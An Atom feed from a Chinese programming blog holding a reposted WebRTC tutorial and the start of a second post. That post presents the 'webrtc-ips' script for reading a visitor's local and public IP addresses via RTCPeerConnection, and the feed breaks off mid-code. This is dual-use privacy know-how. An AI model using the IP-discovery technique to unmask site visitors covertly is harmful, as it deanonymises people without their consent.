<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[M4ster's blog]]></title>
  <subtitle><![CDATA[分享学习和生活中的点滴]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="http://www.m4ster.net/"/>
  <updated>2015-01-29T15:34:15.572Z</updated>
  <id>http://www.m4ster.net/</id>
  
  <author>
    <name><![CDATA[M4ster]]></name>
    <email><![CDATA[www.m4ster@gmail.com]]></email>
  </author>
  
  <generator uri="http://zespia.tw/hexo/">Hexo</generator>
  
  <entry>
    <title><![CDATA[【转载】WebRTC简介]]></title>
    <link href="http://www.m4ster.net/2015/01/28/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91WebRTC%E7%AE%80%E4%BB%8B/"/>
    <id>http://www.m4ster.net/2015/01/28/【转载】WebRTC简介/</id>
    <published>2015-01-28T03:27:29.000Z</published>
    <updated>2015-01-28T18:00:51.000Z</updated>
    <content type="html"><![CDATA[<h2 id="概述">概述</h2>
<p>WebRTC是“网络实时通信”（Web Real Time Communication）的缩写。它最初是为了解决浏览器上视频通话而提出的，即两个浏览器之间直接进行视频和音频的通信，不经过服务器。后来发展到除了音频和视频，还可以传输文字和其他数据。<br>Google是WebRTC的主要支持者和开发者，它最初在Gmail上推出了视频聊天，后来在2011年推出了Hangouts，语音在浏览器中打电话。它推动了WebRTC标准的确立。<br>WebRTC主要让浏览器具备三个作用。  </p>
<blockquote>
<p>获取音频和视频<br>进行音频和视频通信<br>进行任意数据的通信  </p>
</blockquote>
<p>WebRTC共分成三个API，分别对应上面三个作用。</p>
<blockquote>
<p>MediaStream （又称getUserMedia）<br>RTCPeerConnection<br>RTCDataChannel  </p>
</blockquote>
<h2 id="getUserMedia">getUserMedia</h2>
<h3 id="概述-1">概述</h3>
<p>navigator.getUserMedia方法目前主要用于，在浏览器中获取音频（通过麦克风）和视频（通过摄像头），将来可以用于获取任意数据流，比如光盘和传感器。<br>下面的代码用于检查浏览器是否支持getUserMedia方法。  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">navigator.getUserMedia  = navigator.getUserMedia ||</div><div class="line">                          navigator.webkitGetUserMedia ||</div><div class="line">                          navigator.mozGetUserMedia ||</div><div class="line">                          navigator.msGetUserMedia;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (navigator.getUserMedia) {</div><div class="line">    <span class="comment">// 支持</span></div><div class="line">    alert(<span class="string">'支持'</span>)</div><div class="line">} <span class="keyword">else</span> {</div><div class="line">    <span class="comment">// 不支持</span></div><div class="line">    alert(<span class="string">'不支持'</span>)</div><div class="line">}</div></pre></td></tr></table></figure>

<p>Chrome 21, Opera 18和Firefox 17，支持该方法。目前，IE还不支持，上面代码中的msGetUserMedia，只是为了确保将来的兼容。<br>getUserMedia方法接受三个参数。 </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="tag">navigator</span><span class="class">.getUserMedia</span>(<span class="rules">{</span></div><div class="line">    <span class="rule"><span class="attribute">video</span>:<span class="value"> true, </span></span></div><div class="line">    audio: true</div><div class="line">}, <span class="tag">onSuccess</span>, <span class="tag">onError</span>);</div></pre></td></tr></table></figure>

<p>getUserMedia的第一个参数是一个对象，表示要获取哪些多媒体设备，上面的代码表示获取摄像头和麦克风;onSuccess是一个回调函数，在获取多媒体设备成功时调用；onError也是一个回调函数，在取多媒体设备失败时调用。  </p>
<p>下面是一个例子：  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> constraints = {video: <span class="literal">true</span>};</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">onSuccess</span><span class="params">(stream)</span> </span>{</div><div class="line">  <span class="keyword">var</span> video = <span class="built_in">document</span>.querySelector(<span class="string">"video"</span>);</div><div class="line">  video.src = <span class="built_in">window</span>.URL.createObjectURL(stream);</div><div class="line">}</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">onError</span><span class="params">(error)</span> </span>{</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">"navigator.getUserMedia error: "</span>, error);</div><div class="line">}</div><div class="line"></div><div class="line">navigator.getUserMedia(constraints, onSuccess, onError);</div></pre></td></tr></table></figure>

<p>如果网页使用了getUserMedia方法，浏览器就会询问用户，是否同意浏览器调用麦克风或摄像头。如果用户同意，就调用回调函数onSuccess；如果用户拒绝，就调用回调函数onError。  </p>
<p>onSuccess回调函数的参数是一个数据流对象stream。stream.getAudioTracks方法和stream.getVideoTracks方法，分别返回一个数组，其成员是数据流包含的音轨和视轨（track）。使用的声音源和摄影头的数量，决定音轨和视轨的数量。比如，如果只使用一个摄像头获取视频，且不获取音频，那么视轨的数量为1，音轨的数量为0。每个音轨和视轨，有一个kind属性，表示种类（video或者audio），和一个label属性（比如FaceTime HD Camera (Built-in)）。  </p>
<p>onError回调函数接受一个Error对象作为参数。Error对象的code属性有如下取值，说明错误的类型。</p>
<blockquote>
<p>PERMISSION_DENIED：用户拒绝提供信息。<br>NOT_SUPPORTED_ERROR：浏览器不支持硬件设备。<br>MANDATORY_UNSATISFIED_ERROR：无法发现指定的硬件设备。</p>
</blockquote>
<h3 id="范例：获取摄像头">范例：获取摄像头</h3>
<p>下面通过getUserMedia方法，将摄像头拍摄的图像展示在网页上。  </p>
<p>首先，需要先在网页上放置一个video元素。图像就展示在这个元素中。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">video</span> <span class="attribute">id</span>=<span class="value">"webcam"</span>&gt;</span><span class="tag">&lt;/<span class="title">video</span>&gt;</span></div></pre></td></tr></table></figure>

<p>然后，用代码获取这个元素。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">onSuccess</span><span class="params">(stream)</span> </span>{</div><div class="line">    <span class="keyword">var</span> video = <span class="built_in">document</span>.getElementById(<span class="string">'webcam'</span>);</div><div class="line">}</div></pre></td></tr></table></figure>

<p>接着，将这个元素的src属性绑定数据流，摄影头拍摄的图像就可以显示了。  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">onSuccess</span><span class="params">(stream)</span> </span>{</div><div class="line">    <span class="keyword">var</span> video = <span class="built_in">document</span>.getElementById(<span class="string">'webcam'</span>);</div><div class="line">    <span class="keyword">if</span> (<span class="built_in">window</span>.URL) {</div><div class="line">        video.src = <span class="built_in">window</span>.URL.createObjectURL(stream);</div><div class="line">    } <span class="keyword">else</span> {</div><div class="line">        video.src = stream;</div><div class="line">    }</div><div class="line"></div><div class="line">    video.autoplay = <span class="literal">true</span>; </div><div class="line">    <span class="comment">// 或者 video.play();</span></div><div class="line">}</div><div class="line"></div><div class="line"><span class="keyword">if</span> (navigator.getUserMedia) {</div><div class="line">    navigator.getUserMedia({video:<span class="literal">true</span>}, onSuccess);</div><div class="line">} <span class="keyword">else</span> {</div><div class="line">    <span class="built_in">document</span>.getElementById(<span class="string">'webcam'</span>).src = <span class="string">'somevideo.mp4'</span>;</div><div class="line">}</div></pre></td></tr></table></figure>

<p>在Chrome和Opera中，URL.createObjectURL方法将媒体数据流（MediaStream）转为一个二进制对象的URL（Blob URL），该URL可以作为video元素的src属性的值。 在Firefox中，媒体数据流可以直接作为src属性的值。Chrome和Opera还允许getUserMedia获取的音频数据，直接作为audio或者video元素的值，也就是说如果还获取了音频，上面代码播放出来的视频是有声音的。  </p>
<p>获取摄像头的主要用途之一，是让用户使用摄影头为自己拍照。Canvas API有一个ctx.drawImage(video, 0, 0)方法，可以将视频的一个帧转为canvas元素。这使得截屏变得非常容易。  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">video</span> <span class="attribute">autoplay</span>&gt;</span><span class="tag">&lt;/<span class="title">video</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">""</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">canvas</span> <span class="attribute">style</span>=<span class="value">"display:none;"</span>&gt;</span><span class="tag">&lt;/<span class="title">canvas</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"></span></div><div class="line">  <span class="keyword">var</span> video = <span class="built_in">document</span>.querySelector(<span class="string">'video'</span>);</div><div class="line">  <span class="keyword">var</span> canvas = <span class="built_in">document</span>.querySelector(<span class="string">'canvas'</span>);</div><div class="line">  <span class="keyword">var</span> ctx = canvas.getContext(<span class="string">'2d'</span>);</div><div class="line">  <span class="keyword">var</span> localMediaStream = <span class="literal">null</span>;</div><div class="line"></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">snapshot</span><span class="params">()</span> </span>{</div><div class="line">    <span class="keyword">if</span> (localMediaStream) {</div><div class="line">      ctx.drawImage(video, <span class="number">0</span>, <span class="number">0</span>);</div><div class="line">      <span class="comment">// “image/webp”对Chrome有效，</span></div><div class="line">      <span class="comment">// 其他浏览器自动降为image/png</span></div><div class="line">      <span class="built_in">document</span>.querySelector(<span class="string">'img'</span>).src = canvas.toDataURL(<span class="string">'image/webp'</span>);</div><div class="line">    }</div><div class="line">  }</div><div class="line"></div><div class="line">  video.addEventListener(<span class="string">'click'</span>, snapshot, <span class="literal">false</span>);</div><div class="line"></div><div class="line">  navigator.getUserMedia({video: <span class="literal">true</span>}, <span class="function"><span class="keyword">function</span><span class="params">(stream)</span> </span>{</div><div class="line">    video.src = <span class="built_in">window</span>.URL.createObjectURL(stream);</div><div class="line">    localMediaStream = stream;</div><div class="line">  }, errorCallback);</div><div class="line"><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>

<h3 id="范例：捕获麦克风声音">范例：捕获麦克风声音</h3>
<p>通过浏览器捕获声音，需要借助Web Audio API。   </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">window</span>.AudioContext = <span class="built_in">window</span>.AudioContext ||</div><div class="line">                      <span class="built_in">window</span>.webkitAudioContext;</div><div class="line"></div><div class="line"><span class="keyword">var</span> context = <span class="keyword">new</span> AudioContext();</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">onSuccess</span><span class="params">(stream)</span> </span>{</div><div class="line">    <span class="keyword">var</span> audioInput = context.createMediaStreamSource(stream);</div><div class="line">    audioInput.connect(context.destination);</div><div class="line">}</div><div class="line"></div><div class="line">navigator.getUserMedia({audio:<span class="literal">true</span>}, onSuccess);</div></pre></td></tr></table></figure>

<h3 id="捕获的限定条件">捕获的限定条件</h3>
<p>getUserMedia方法的第一个参数，除了指定捕获对象之外，还可以指定一些限制条件，比如限定只能录制高清（或者VGA标准）的视频。  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> hdConstraints = {</div><div class="line">  video: {</div><div class="line">    mandatory: {</div><div class="line">      minWidth: <span class="number">1280</span>,</div><div class="line">      minHeight: <span class="number">720</span></div><div class="line">    }</div><div class="line">  }</div><div class="line">};</div><div class="line"></div><div class="line">navigator.getUserMedia(hdConstraints, onSuccess, onError);</div><div class="line"></div><div class="line"><span class="keyword">var</span> vgaConstraints = {</div><div class="line">  video: {</div><div class="line">    mandatory: {</div><div class="line">      maxWidth: <span class="number">640</span>,</div><div class="line">      maxHeight: <span class="number">360</span></div><div class="line">    }</div><div class="line">  }</div><div class="line">};</div><div class="line"></div><div class="line">navigator.getUserMedia(vgaConstraints, onSuccess, onError);</div></pre></td></tr></table></figure>

<h3 id="MediaStreamTrack-getSources()">MediaStreamTrack.getSources()</h3>
<p>如果本机有多个摄像头/麦克风，这时就需要使用MediaStreamTrack.getSources方法指定，到底使用哪一个摄像头/麦克风。  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">MediaStreamTrack.getSources(function(<span class="built_in">source</span>Infos) {</div><div class="line">  var audioSource = null;</div><div class="line">  var videoSource = null;</div><div class="line"></div><div class="line">  <span class="keyword">for</span> (var i = <span class="number">0</span>; i != <span class="built_in">source</span>Infos.length; ++i) {</div><div class="line">    var <span class="built_in">source</span>Info = <span class="built_in">source</span>Infos[i];</div><div class="line">    <span class="keyword">if</span> (<span class="built_in">source</span>Info.kind === <span class="string">'audio'</span>) {</div><div class="line">      console.log(<span class="built_in">source</span>Info.id, <span class="built_in">source</span>Info.label || <span class="string">'microphone'</span>);</div><div class="line"></div><div class="line">      audioSource = <span class="built_in">source</span>Info.id;</div><div class="line">    } <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">source</span>Info.kind === <span class="string">'video'</span>) {</div><div class="line">      console.log(<span class="built_in">source</span>Info.id, <span class="built_in">source</span>Info.label || <span class="string">'camera'</span>);</div><div class="line"></div><div class="line">      videoSource = <span class="built_in">source</span>Info.id;</div><div class="line">    } <span class="keyword">else</span> {</div><div class="line">      console.log(<span class="string">'Some other kind of source: '</span>, <span class="built_in">source</span>Info);</div><div class="line">    }</div><div class="line">  }</div><div class="line"></div><div class="line">  <span class="built_in">source</span>Selected(audioSource, videoSource);</div><div class="line">});</div><div class="line"></div><div class="line">function <span class="built_in">source</span>Selected(audioSource, videoSource) {</div><div class="line">  var constraints = {</div><div class="line">    audio: {</div><div class="line">      optional: [{<span class="built_in">source</span>Id: audioSource}]</div><div class="line">    },</div><div class="line">    video: {</div><div class="line">      optional: [{<span class="built_in">source</span>Id: videoSource}]</div><div class="line">    }</div><div class="line">  };</div><div class="line"></div><div class="line">  navigator.getUserMedia(constraints, onSuccess, onError);</div><div class="line">}</div></pre></td></tr></table></figure>

<p>上面代码表示，MediaStreamTrack.getSources方法的回调函数，可以得到一个本机的摄像头和麦克风的列表，然后指定使用最后一个摄像头和麦克风。  </p>
<h2 id="RTCPeerConnectionl，RTCDataChannel">RTCPeerConnectionl，RTCDataChannel</h2>
<h3 id="RTCPeerConnectionl">RTCPeerConnectionl</h3>
<p>RTCPeerConnection的作用是在浏览器之间建立数据的“点对点”（peer to peer）通信，也就是将浏览器获取的麦克风或摄像头数据，传播给另一个浏览器。这里面包含了很多复杂的工作，比如信号处理、多媒体编码/解码、点对点通信、数据安全、带宽管理等等。  </p>
<p>不同客户端之间的音频/视频传递，是不用通过服务器的。但是，两个客户端之间建立联系，需要通过服务器。服务器主要转递两种数据。  </p>
<blockquote>
<p>通信内容的元数据：打开/关闭对话（session）的命令、媒体文件的元数据（编码格式、媒体类型和带宽）等。<br>网络通信的元数据：IP地址、NAT网络地址翻译和防火墙等。</p>
</blockquote>
<p>WebRTC协议没有规定与服务器的通信方式，因此可以采用各种方式，比如WebSocket。通过服务器，两个客户端按照Session Description Protocol（SDP协议）交换双方的元数据。  </p>
<p>下面是一个示例。  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> signalingChannel = createSignalingChannel();</div><div class="line"><span class="keyword">var</span> pc;</div><div class="line"><span class="keyword">var</span> configuration = ...;</div><div class="line"></div><div class="line"><span class="comment">// run start(true) to initiate a call</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">start</span><span class="params">(isCaller)</span> </span>{</div><div class="line">    pc = <span class="keyword">new</span> RTCPeerConnection(configuration);</div><div class="line"></div><div class="line">    <span class="comment">// send any ice candidates to the other peer</span></div><div class="line">    pc.onicecandidate = <span class="function"><span class="keyword">function</span> <span class="params">(evt)</span> </span>{</div><div class="line">        signalingChannel.send(<span class="built_in">JSON</span>.stringify({ <span class="string">"candidate"</span>: evt.candidate }));</div><div class="line">    };</div><div class="line"></div><div class="line">    <span class="comment">// once remote stream arrives, show it in the remote video element</span></div><div class="line">    pc.onaddstream = <span class="function"><span class="keyword">function</span> <span class="params">(evt)</span> </span>{</div><div class="line">        remoteView.src = URL.createObjectURL(evt.stream);</div><div class="line">    };</div><div class="line"></div><div class="line">    <span class="comment">// get the local stream, show it in the local video element and send it</span></div><div class="line">    navigator.getUserMedia({ <span class="string">"audio"</span>: <span class="literal">true</span>, <span class="string">"video"</span>: <span class="literal">true</span> }, <span class="function"><span class="keyword">function</span> <span class="params">(stream)</span> </span>{</div><div class="line">        selfView.src = URL.createObjectURL(stream);</div><div class="line">        pc.addStream(stream);</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (isCaller)</div><div class="line">            pc.createOffer(gotDescription);</div><div class="line">        <span class="keyword">else</span></div><div class="line">            pc.createAnswer(pc.remoteDescription, gotDescription);</div><div class="line"></div><div class="line">        <span class="function"><span class="keyword">function</span> <span class="title">gotDescription</span><span class="params">(desc)</span> </span>{</div><div class="line">            pc.setLocalDescription(desc);</div><div class="line">            signalingChannel.send(<span class="built_in">JSON</span>.stringify({ <span class="string">"sdp"</span>: desc }));</div><div class="line">        }</div><div class="line">    });</div><div class="line">}</div><div class="line"></div><div class="line">signalingChannel.onmessage = <span class="function"><span class="keyword">function</span> <span class="params">(evt)</span> </span>{</div><div class="line">    <span class="keyword">if</span> (!pc)</div><div class="line">        start(<span class="literal">false</span>);</div><div class="line"></div><div class="line">    <span class="keyword">var</span> signal = <span class="built_in">JSON</span>.parse(evt.data);</div><div class="line">    <span class="keyword">if</span> (signal.sdp)</div><div class="line">        pc.setRemoteDescription(<span class="keyword">new</span> RTCSessionDescription(signal.sdp));</div><div class="line">    <span class="keyword">else</span></div><div class="line">        pc.addIceCandidate(<span class="keyword">new</span> RTCIceCandidate(signal.candidate));</div><div class="line">};</div></pre></td></tr></table></figure>

<p>RTCPeerConnection带有浏览器前缀，Chrome浏览器中为webkitRTCPeerConnection，Firefox浏览器中为mozRTCPeerConnection。Google维护一个函数库adapter.js，用来抽象掉浏览器之间的差异。  </p>
<h3 id="RTCDataChannel">RTCDataChannel</h3>
<p>RTCDataChannel的作用是在点对点之间，传播任意数据。它的API与WebSockets的API相同。  </p>
<p>下面是一个示例。  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> pc = <span class="keyword">new</span> webkitRTCPeerConnection(servers,</div><div class="line">  {optional: [{RtpDataChannels: <span class="literal">true</span>}]});</div><div class="line"></div><div class="line">pc.ondatachannel = <span class="function"><span class="keyword">function</span><span class="params">(event)</span> </span>{</div><div class="line">  receiveChannel = event.channel;</div><div class="line">  receiveChannel.onmessage = <span class="function"><span class="keyword">function</span><span class="params">(event)</span></span>{</div><div class="line">    <span class="built_in">document</span>.querySelector(<span class="string">"div#receive"</span>).innerHTML = event.data;</div><div class="line">  };</div><div class="line">};</div><div class="line"></div><div class="line">sendChannel = pc.createDataChannel(<span class="string">"sendDataChannel"</span>, {reliable: <span class="literal">false</span>});</div><div class="line"></div><div class="line"><span class="built_in">document</span>.querySelector(<span class="string">"button#send"</span>).onclick = <span class="function"><span class="keyword">function</span> <span class="params">()</span></span>{</div><div class="line">  <span class="keyword">var</span> data = <span class="built_in">document</span>.querySelector(<span class="string">"textarea#send"</span>).value;</div><div class="line">  sendChannel.send(data);</div><div class="line">};</div></pre></td></tr></table></figure>

<p>Chrome 25、Opera 18和Firefox 22支持RTCDataChannel。</p>
<h3 id="外部函数库">外部函数库</h3>
<p>由于这两个API比较复杂，一般采用外部函数库进行操作。目前，视频聊天的函数库有<a href="https://github.com/henrikjoreteg/SimpleWebRTC" target="_blank" rel="external">SimpleWebRTC</a>、<a href="https://github.com/priologic/easyrtc" target="_blank" rel="external">easyRTC</a>、<a href="https://github.com/webRTC/webRTC.io" target="_blank" rel="external">webRTC.io</a>，点对点通信的函数库有<a href="http://peerjs.com/" target="_blank" rel="external">PeerJS</a>、<a href="https://github.com/peer5/sharefest" target="_blank" rel="external">Sharefest</a>。  </p>
<p>下面是SimpleWebRTC的示例。  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> webrtc = <span class="keyword">new</span> WebRTC({</div><div class="line">  localVideoEl: <span class="string">'localVideo'</span>,</div><div class="line">  remoteVideosEl: <span class="string">'remoteVideos'</span>,</div><div class="line">  autoRequestMedia: <span class="literal">true</span></div><div class="line">});</div><div class="line"></div><div class="line">webrtc.on(<span class="string">'readyToCall'</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>{</div><div class="line">    webrtc.joinRoom(<span class="string">'My room name'</span>);</div><div class="line">});</div></pre></td></tr></table></figure>

<p>下面是PeerJS的示例。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> peer = <span class="keyword">new</span> Peer(<span class="string">'someid'</span>, {key: <span class="string">'apikey'</span>});</div><div class="line">peer.on(<span class="string">'connection'</span>, <span class="function"><span class="keyword">function</span><span class="params">(conn)</span> </span>{</div><div class="line">  conn.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span><span class="params">(data)</span></span>{</div><div class="line">    <span class="comment">// Will print 'hi!'</span></div><div class="line">    <span class="built_in">console</span>.log(data);</div><div class="line">  });</div><div class="line">});</div><div class="line"></div><div class="line"><span class="comment">// Connecting peer</span></div><div class="line"><span class="keyword">var</span> peer = <span class="keyword">new</span> Peer(<span class="string">'anotherid'</span>, {key: <span class="string">'apikey'</span>});</div><div class="line"><span class="keyword">var</span> conn = peer.connect(<span class="string">'someid'</span>);</div><div class="line">conn.on(<span class="string">'open'</span>, <span class="function"><span class="keyword">function</span><span class="params">()</span></span>{</div><div class="line">  conn.send(<span class="string">'hi!'</span>);</div><div class="line">});</div></pre></td></tr></table></figure>

<h2 id="参考链接">参考链接</h2>
<p>[1]Andi Smith，<a href="http://www.netmagazine.com/tutorials/get-started-webrtc" target="_blank" rel="external">Get Started with WebRTC</a><br>[2]Thibault Imbert, <a href="http://typedarray.org/from-microphone-to-wav-with-getusermedia-and-web-audio/" target="_blank" rel="external">From microphone to .WAV with: getUserMedia and Web Audio</a><br>[3]Ian Devlin, <a href="http://html5hub.com/using-the-getusermedia-api-with-the-html5-video-and-canvas-elements/#i.bz41ehmmhd3311" target="_blank" rel="external">Using the getUserMedia API with the HTML5 video and canvas elements</a><br>[4]Eric Bidelman, <a href="http://www.html5rocks.com/en/tutorials/getusermedia/intro/" target="_blank" rel="external">Capturing Audio &amp; Video in HTML5</a><br>[5]Sam Dutton, <a href="http://www.html5rocks.com/en/tutorials/webrtc/basics/" target="_blank" rel="external">Getting Started with WebRTC</a><br>[6]Dan Ristic, <a href="http://www.html5rocks.com/en/tutorials/webrtc/datachannels/" target="_blank" rel="external">WebRTC data channels</a><br>[7]Justin Uberti, Sam Dutton, <a href="http://io13webrtc.appspot.com/" target="_blank" rel="external">WebRTC: Plugin-free realtime communication</a><br>[8]Mozilla Developer Network, <a href="https://developer.mozilla.org/en-US/docs/Web/Guide/API/WebRTC/Taking_webcam_photos" target="_blank" rel="external">Taking webcam photos</a><br>[9]Sam Dutton, <a href="http://www.html5rocks.com/en/tutorials/webrtc/infrastructure/" target="_blank" rel="external">WebRTC in the real world: STUN, TURN and signaling</a>  </p>
<h2 id="来源">来源</h2>
<blockquote>
<p><a href="http://javascript.ruanyifeng.com/htmlapi/webrtc.html" target="_blank" rel="external">http://javascript.ruanyifeng.com/htmlapi/webrtc.html</a></p>
</blockquote>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="概述">概述</h2>
<p>WebRTC是“网络实时通信”（Web Real Time Communication）的缩写。它最初是为了解决浏览器上视频通话而提出的，即两个浏览器之间直接进行视频和音频的通信，不经过服务器。后来发展到除了音频和视频，还可以传输文字]]>
    </summary>
    
      <category term="WebRTC" scheme="http://www.m4ster.net/tags/WebRTC/"/>
    
      <category term="javascript" scheme="http://www.m4ster.net/categories/javascript/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[使用JavaScript获取本地和公网IP]]></title>
    <link href="http://www.m4ster.net/2015/01/28/%E4%BD%BF%E7%94%A8JavaScript%E8%8E%B7%E5%8F%96%E6%9C%AC%E5%9C%B0%E5%92%8C%E5%85%AC%E7%BD%91IP/"/>
    <id>http://www.m4ster.net/2015/01/28/使用JavaScript获取本地和公网IP/</id>
    <published>2015-01-28T02:44:50.000Z</published>
    <updated>2015-01-29T15:33:48.000Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>前些天老外发出了一个脚本，可以使用JavaScript获取真实的内网IP和外网IP。</p>
</blockquote>
<h2 id="webrtc-ips：">webrtc-ips：</h2>
<pre><code><span class="comment">//get the IP addresses associated with an account </span>
<span class="function"><span class="keyword">function</span> <span class="title">getIPs</span><span class="params">(callback)</span></span>{ 
    <span class="keyword">var</span> ip_dups = {}; 

    <span class="comment">//compatibility for firefox and chrome </span>
    <span class="keyword">var</span> RTCPeerConnection = <span class="built_in">window</span>.RTCPeerConnection 
        || <span class="built_in">window</span>.mozRTCPeerConnection 
        || <span class="built_in">window</span>.webkitRTCPeerConnection; 
    <span class="keyword">var</span> mediaConstraints = { 
        optional: [{RtpDataChannels: <span class="literal">true</span>}] 
    }; 

    <span class="comment">//firefox already has a default stun server in about:config </span>
    <span class="comment">//    media.peerconnection.default_iceservers = </span>
    <span class="comment">//    [{"url": "stun:stun.services.mozilla.com"}] </span>
    <span class="keyword">var</span> servers = <span class="literal">undefined</span>; 

    <span class="comment">//add same stun server for chrome </span>
    <span class="keyword">if</span>(<span class="built_in">window</span>.webkitRTCPeerConnection) 
